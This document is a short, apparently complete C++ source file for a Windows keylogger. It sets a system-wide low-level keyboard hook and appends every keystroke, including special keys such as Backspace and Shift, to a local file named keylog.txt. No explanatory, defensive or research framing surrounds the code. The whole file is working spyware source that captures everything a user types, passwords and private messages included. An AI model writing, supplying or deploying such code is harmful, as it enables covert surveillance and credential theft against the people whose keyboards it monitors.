#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

void logKeyStroke(int key) {
    ofstream logFile;
    logFile.open("keylog.txt", ios::app);
    if (!logFile) {
        cerr << "Cannot open log file.\n";
        return;
    }

    // If key is BACKSPACE
    if(key == VK_BACK) {
        logFile << "[BACKSPACE]";
    }
    else if (key == VK_RETURN) {
        logFile << " ";
    }
    else if (key == VK_TAB) {
        logFile << "[TAB]";
    }
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT ) {
        logFile << "[SHIFT]";
    }
    else if (key == VK_ESCAPE) {
        logFile << "[ESC]";
    }
    else if (key == VK_OEM_PERIOD) {
        logFile << ".";
    }
    // Logging alphabetic keys and numbers as char
    else if (key >= 'A' && key <= 'Z') {
        logFile << char(key);
    }
    else if (key >= '0' && key <= '9') {
        logFile << char(key);
    }
    // Log other keys using their virtual keycode
    else {
        logFile << "[" << key << "]";
    }

    logFile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        logKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // SetWindowsHookEx calls KeyboardProc
    //type of hook WH_KEYBOARD_LL, Low-Level Keyboard Hook, captures all keyboard input 
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;

    // Windows Message Loop
    // Getmessage retrieves messages (keyboard/mouse)
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);             // converting key presses into char message
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}